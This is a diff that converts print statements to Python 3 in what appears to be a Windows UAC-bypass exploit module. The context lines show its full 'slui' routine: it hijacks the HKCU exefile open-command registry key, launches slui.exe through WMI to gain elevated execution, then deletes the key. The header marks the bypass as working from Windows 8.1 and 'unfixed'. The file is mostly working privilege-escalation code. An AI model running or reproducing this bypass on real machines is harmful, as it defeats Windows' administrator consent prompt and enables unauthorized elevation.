@@ -2,6 +2,7 @@
 Works from: Windows 8.1 (9600)
 Fixed in: unfixed
 """
+from __future__ import print_function
 import os
 import wmi
 import time
@@ -27,7 +28,7 @@ def warningBox():
 	return (Fore.YELLOW + '[!]' + Fore.RESET)
 
 def slui():
-	print " {} slui: Attempting to create registry key".format(infoBox())
+	print(" {} slui: Attempting to create registry key".format(infoBox()))
 	try:
 		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
 					os.path.join("Software\Classes\exefile\shell\open\command"))
@@ -45,34 +46,34 @@ def slui():
 				None)
 
 		_winreg.CloseKey(key)
-		print " {} slui: Registry key created".format(successBox())
+		print(" {} slui: Registry key created".format(successBox()))
 	except Exception as error:
-		print " {} slui: Unable to create key".format(errorBox())
+		print(" {} slui: Unable to create key".format(errorBox()))
 		return False
 
-	print " {} slui: Pausing for 5 seconds before executing".format(infoBox())
+	print(" {} slui: Pausing for 5 seconds before executing".format(infoBox()))
 	time.sleep(5)
 
-	print " {} slui: Attempting to create process".format(infoBox())
+	print(" {} slui: Attempting to create process".format(infoBox()))
 	try:
 		result = wmi.Win32_Process.Create(CommandLine="cmd.exe /c start slui.exe",
 						ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=win32con.SW_SHOWNORMAL))
 		if (result[1] == 0):
-			print " {} slui: Process started successfully".format(successBox())
+			print(" {} slui: Process started successfully".format(successBox()))
 		else:
-			print " {} slui: Problem creating process".format(errorBox())
+			print(" {} slui: Problem creating process".format(errorBox()))
 	except Exception as error:
-		print " {} slui: Problem creating process".format(errorBox())
+		print(" {} slui: Problem creating process".format(errorBox()))
 		return False
 
-	print " {} slui: Pausing for 5 seconds before cleaning".format(infoBox())
+	print(" {} slui: Pausing for 5 seconds before cleaning".format(infoBox()))
 	time.sleep(5)
 
-	print " {} slui: Attempting to remove registry key".format(infoBox())
+	print(" {} slui: Attempting to remove registry key".format(infoBox()))
 	try:
 		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,
 				os.path.join("Software\Classes\exefile\shell\open\command"))
-		print " {} slui: Registry key was deleted".format(successBox())					
+		print(" {} slui: Registry key was deleted".format(successBox()))					
 	except Exception as error:
-		print " {} slui: Unable to delete key".format(errorBox())
+		print(" {} slui: Unable to delete key".format(errorBox()))
 		return False
